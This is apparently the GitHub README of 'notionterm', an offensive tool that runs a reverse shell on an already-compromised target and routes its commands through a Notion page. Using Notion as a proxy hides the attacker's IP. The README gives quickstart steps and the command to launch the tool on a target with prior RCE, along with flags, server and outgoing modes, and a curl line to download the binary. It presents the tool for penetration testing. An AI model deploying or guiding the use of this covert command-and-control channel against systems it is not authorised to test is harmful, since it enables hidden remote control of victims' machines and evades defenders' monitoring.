<div align="center">
<h1>
  <code>notionterm</code> 
</h1>
  <img src="https://github.com/ariary/notionterm/blob/main/img/notionterm.png"  width=150>
  
  <strong> Embed reverse shell in <a href="https://www.notion.so">Notion</a> pages.</strong><br>
  <i>Hack while taking notes</i>
</div>

---

![demo](https://github.com/ariary/notionterm/blob/main/img/demo_dark_light.gif)

---
<div align=left>
<h3>FOR ➕:</h3>
<ul>
  <li>Hiding attacker IP in reverse shell <i>(No direct interaction between attacker and target machine. Notion is used as a proxy hosting the reverse shell)</i></li>
  <li>Demo</li>
  <li>Quick proof insertion within report</li>
  <li>High available and shareable reverse shell (desktop, browser, mobile)</li>
  <li>Encrypted and authenticated remote shell</li>

</ul> 
</div>
<div align=left>
<h3>NOT FOR ➖:</h3>
<ul>
  <li>Long and interactive shell session (see <a href=https://github.com/ariary/tacos>tacos</a> for that)</li>
</ul>

---
<div align=left>
<h3 >Why? 🤔 </h3>
The focus was on making something fun while still being usable, but that's not meant to be THE solution for reverse shell in the pentester's arsenal
</div>
<div align=right>
<h3 >How?  🤷‍♂️</h3>
Just use notion as usual and launch <code>notionterm</code> on target.
</div>
<div align=left>
<h3 >Requirements 🖊️</h3>
 <ul>
  <li>Notion software and API key</li>
  <li>Allowed HTTP communication between the target and notion domain</li>
  <li>Prior RCE on target</li>
</ul> 
</div>

---
<blockquote align=left>
roughly inspired by the great idea of <a href="https://github.com/mttaggart/OffensiveNotion">OffensiveNotion</a> and <a href="https://github.com/ariary/Notionion">notionion</a>! 
</blockquote>

## Quickstart

**Set-up**
1. Create the "reverse shell" page in Notion: [Page template](https://fluff-grade-468.notion.site/notionterm-template-19dc9d0bbae04f40b56c475f8cd79607)
2. Give the permissions to `notionterm` to access the page (with the notion api key)

**Run** ([details](#-run))

3. Start `notionterm`
4. Activate the reverse shell (with the button `ON`)
5. do your reverse shell stuff
6. Shutdown the reverse shell (`OFF`)

### 👟 Run

```shell
# On target with prior RCE
./notionterm
```

Configuration can be made using:
- Flags
- Configuration table in notion page

You can choose between:
*    `-button-url` string
        override button url (useful if notionterm service is behind a proxy)
*  `-delay` int
        delay between each api call (default 500)
*  `-p` string
        specify target listening port (HTTP traffic)
 * `-serve`
        use notionterm in server mode .i.e wait for request specifying the notion page url to add terminal
*  `-shell` string
        shell runtime ("sh,bash and cmd.exe") (default "sh")

#### Server mode
To quickly obtain terminal in any notion page you can use the server mode (Requirement: *integration w/ write access to the page*)

**First**, Launch notionterm on target with server mode enable:
```shell
notionterm -server [flags]
```
**Then**, when/where you want to get a terminal in your notion page create an embed block with url containing the page id *(`CTRL+L`to get it)*: `https://[TARGET_URL]/notionterm?url=[PAGE_ID]`.

Wait..

**And that's all!**

### Outgoing mode
**+**: only target -> notion page flux *(.i.e No need to have a HTTP server reachable on target)*
```shell
notionterm -outgoing [flags]
```
Launch notionterm and immediatly request notion page to retrieve command to execute (do not wait the button to be clicked).



## Install
* **From release**: `curl -lO -L https://github.com/ariary/notionterm/releases/latest/download/notionterm && chmod +x notionterm`
